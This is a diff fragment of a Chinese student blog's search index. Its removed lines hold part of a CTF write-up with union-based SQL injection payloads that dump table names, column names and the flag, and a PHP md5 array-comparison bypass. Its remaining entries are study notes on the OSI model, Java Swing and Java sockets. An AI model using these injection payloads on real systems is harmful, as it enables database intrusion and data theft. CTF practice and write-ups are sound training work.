-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200606101942263.png" alt="image-20200606101942263"></p>
-<h2 id="Web"><a class="header-anchor" href="#Web"></a>Web</h2>
-<h3 id="题目：sql注入入门题"><a class="header-anchor" href="#题目：sql注入入门题"></a>题目：sql注入入门题</h3>
-<p><strong>flag值：（没记。。）</strong></p>
-<p>一个数字型SQL回显注入</p>
-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/E:%5CProgram%5Cblog%5Csource_posts%5CCTF%5C%E6%AF%94%E8%B5%9B%5CACTF%E6%A0%A1%E8%B5%9BWeb%5Cimage-20200529222156910.png" alt="image-20200529222156910"></p>
-<p>首先猜出字段数为4</p>
-<p>联合查询得到数据库名</p>
-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529222846198.png" alt="image-20200529222846198"></p>
-<p>数据表名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema&#x3D;&#39;easy_sql_injection&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223409586.png" alt="image-20200529223409586"></p>
-<p>列名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(column_name),2,3,4 from information_schema.columns where table_name&#x3D;&#39;Notice&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223713519.png" alt="image-20200529223713519"></p>
-<p>读取数据</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(flag),2,3,4 from Notice</span><br></pre></td></tr></table></figure>
-<p>得到flag</p>
-<h3 id="题目：PHP代码审计入门题"><a class="header-anchor" href="#题目：PHP代码审计入门题"></a>题目：PHP代码审计入门题</h3>
-<p><strong>flag值：（没记。。）</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"not allow!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'key'</span>] != $_SESSION[<span class="string">'key'</span>]) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Wrong key!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>]) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Your password can not be your username!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>第一次登录时，SESSION为空，所以POST一个<code>key=</code>即可，然后是md5，</p>
-<p><code>username[]=1</code> <code>password[]=2</code>即可满足条件</p>
+    <title>OSI模型</title>
+    <url>/2020/08/02/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/OSI%E6%A8%A1%E5%9E%8B/</url>
+    <content><![CDATA[<h1>OSI 模型</h1>
+<h2 id="应用层"><a class="header-anchor" href="#应用层"></a>应用层</h2>
+<p>能产生数据流量的并且能与用户交互的程序</p>
+<p>记事本不是，因为不能产生数据流量</p>
+<h2 id="表示层"><a class="header-anchor" href="#表示层"></a>表示层</h2>
+<p>传递消息的语法和语义（不同内部数据表示法 编码方法 压缩 加密）</p>
+<h2 id="会话层"><a class="header-anchor" href="#会话层"></a>会话层</h2>
+<p>对话控制（记录该由谁来发送数据）</p>
+<p>令牌管理（禁止双方同时执行同一关键操作）</p>
+<p>同步功能（设置断点，崩溃恢复）</p>
+<h2 id="传输层"><a class="header-anchor" href="#传输层"></a>传输层</h2>
+<p>真正的端到端的层。解决的问题：<strong>进程与进程之间传输</strong>、识别进程</p>
+<h2 id="网络层"><a class="header-anchor" href="#网络层"></a>网络层</h2>
+<p>控制子网的运行 ，如何将数据包从源端路由到接收方。解决的问题：<strong>路由</strong>、<strong>拥塞控制</strong>、<strong>异构网络互联</strong></p>
+<h2 id="数据链路层"><a class="header-anchor" href="#数据链路层"></a>数据链路层</h2>
+<p>将一个原始的传输设施转变成一条没有漏检传输错误的线路。解决的问题：数据帧、流量控制、信道共享</p>
+<h2 id="物理层"><a class="header-anchor" href="#物理层"></a>物理层</h2>
+<p>关注在一条通信信道中传输原始比特。解决的问题：1，0的表示、比特维持时间、是否双向同时传输、连接建立，撤销、物理传输介质等</p>
+<p><img src="/2020/08/02/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/OSI%E6%A8%A1%E5%9E%8B/image-20200801114821400.png" alt="image-20200801114821400"></p>
 ]]></content>
       <categories>
-        <category>CTF</category>
+        <category>专业课</category>
+        <category>计网</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java-GUI编程</title>
-    <url>/2020/07/10/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/GUI%E7%BC%96%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="swing"><a class="header-anchor" href="#swing"></a>swing</h2>
-<p><strong>JFrame</strong> – java的GUI程序的基本思路是以JFrame为基础，它是屏幕上window的对象，能够最大化、最小化、关闭。<br>
-<strong>JPanel</strong> – Java图形用户界面(GUI)工具包swing中的面板容器类，包含在javax.swing 包中，可以进行嵌套，功能是对窗体中具有相同逻辑功能的组件进行组合，是一种轻量级容器，可以加入到JFrame窗体中。</p>
-<p><strong>JLabel</strong> – JLabel 对象可以显示文本、图像或同时显示二者。可以通过设置垂直和水平对齐方式，指定标签显示区中标签内容在何处对齐。默认情况下，标签在其显示区内垂直居中对齐。默认情况下，只显示文本的标签是开始边对齐；而只显示图像的标签则水平居中对齐。</p>
-<p><strong>JTextField</strong> –一个轻量级组件，它允许编辑单行文本。</p>
-<p><strong>JPasswordField</strong> – 允许我们输入一行字，像输入框，但隐藏输入字符为星号(*)。</p>
-<p><strong>JButton</strong> – JButton 类的实例。用于创建按钮类似实例中的 “Login”。</p>
-]]></content>
-      <categories>
-        <category>编程语言</category>
-        <category>Java</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-        <tag>GUI</tag>
+        <tag>计算机网络</tag>
       </tags>
   </entry>
   <entry>
@@ -466,6 +657,26 @@
       </tags>
   </entry>
   <entry>
+    <title>Java-GUI编程</title>
+    <url>/2020/07/10/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/GUI%E7%BC%96%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="swing"><a class="header-anchor" href="#swing"></a>swing</h2>
+<p><strong>JFrame</strong> – java的GUI程序的基本思路是以JFrame为基础，它是屏幕上window的对象，能够最大化、最小化、关闭。<br>
+<strong>JPanel</strong> – Java图形用户界面(GUI)工具包swing中的面板容器类，包含在javax.swing 包中，可以进行嵌套，功能是对窗体中具有相同逻辑功能的组件进行组合，是一种轻量级容器，可以加入到JFrame窗体中。</p>
+<p><strong>JLabel</strong> – JLabel 对象可以显示文本、图像或同时显示二者。可以通过设置垂直和水平对齐方式，指定标签显示区中标签内容在何处对齐。默认情况下，标签在其显示区内垂直居中对齐。默认情况下，只显示文本的标签是开始边对齐；而只显示图像的标签则水平居中对齐。</p>
+<p><strong>JTextField</strong> –一个轻量级组件，它允许编辑单行文本。</p>
+<p><strong>JPasswordField</strong> – 允许我们输入一行字，像输入框，但隐藏输入字符为星号(*)。</p>
+<p><strong>JButton</strong> – JButton 类的实例。用于创建按钮类似实例中的 “Login”。</p>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>GUI</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java 异常及处理</title>
     <url>/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/</url>
     <content><![CDATA[<h2 id="分类"><a class="header-anchor" href="#分类"></a>分类</h2>
@@ -508,6 +719,24 @@
       </tags>
   </entry>
   <entry>
+    <title>Java网络编程</title>
+    <url>/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="SOCKET"><a class="header-anchor" href="#SOCKET"></a>SOCKET</h2>
+<p><strong>定义：<code>socket</code>即套接字，由 ip 地址和端口号两个部分组成</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InetAddress类：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getByName</span><span class="params">(String host)</span> <span class="comment">//根据域名获取ip</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getLocalHost</span><span class="params">()</span> <span class="comment">//获取本地ip</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHostAddress</span><span class="params">()</span> <span class="comment">//获得InetAddress对象的ip地址</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHostName</span><span class="params">()</span> <span class="comment">//获得InetAddress对象的域名</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Socket类：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(InetAddress address, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(String host, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Socket <span class="title">accept</span><span class="params">()</span> <span class="comment">//服务器端接收socket连接请求，创建socket对象</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输入流，用于接收网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> OutputStream <span class="title">getOutputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输出流，用于发送网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getInetAddress</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程IP地址或null</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getLocalAddress</span><span class="params">()</span> <span class="comment">//获取套接字绑定的本地地址</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPort</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程端口号或0</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLocalPort</span><span class="params">()</span> <span class="comment">//返回此套接字绑定到的本地端口或 -1</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708193332767.png" alt="image-20200708193332767"></p>
+<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708213133726.png" alt="image-20200708213133726"></p>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java 抽象类和接口</title>
     <url>/2020/04/27/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3/</url>
     <content><![CDATA[<h2 id="抽象类"><a class="header-anchor" href="#抽象类"></a>抽象类</h2>
@@ -528,24 +757,6 @@
 <h3 id="实现"><a class="header-anchor" href="#实现"></a>实现</h3>
 <p>关键字：<code>implements</code></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class A implements 接口名称 [,接口名称,...]&#123;</span><br><span class="line">		&#x2F;&#x2F;实现接口中的方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>编程语言</category>
-        <category>Java</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java网络编程</title>
-    <url>/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="SOCKET"><a class="header-anchor" href="#SOCKET"></a>SOCKET</h2>
-<p><strong>定义：<code>socket</code>即套接字，由 ip 地址和端口号两个部分组成</strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InetAddress类：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getByName</span><span class="params">(String host)</span> <span class="comment">//根据域名获取ip</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getLocalHost</span><span class="params">()</span> <span class="comment">//获取本地ip</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHostAddress</span><span class="params">()</span> <span class="comment">//获得InetAddress对象的ip地址</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHostName</span><span class="params">()</span> <span class="comment">//获得InetAddress对象的域名</span></span></span><br></pre></td></tr></table></figure>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Socket类：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(InetAddress address, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(String host, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Socket <span class="title">accept</span><span class="params">()</span> <span class="comment">//服务器端接收socket连接请求，创建socket对象</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输入流，用于接收网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> OutputStream <span class="title">getOutputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输出流，用于发送网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getInetAddress</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程IP地址或null</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getLocalAddress</span><span class="params">()</span> <span class="comment">//获取套接字绑定的本地地址</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPort</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程端口号或0</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLocalPort</span><span class="params">()</span> <span class="comment">//返回此套接字绑定到的本地端口或 -1</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
-<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708193332767.png" alt="image-20200708193332767"></p>
-<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708213133726.png" alt="image-20200708213133726"></p>
 ]]></content>
       <categories>
         <category>编程语言</category>
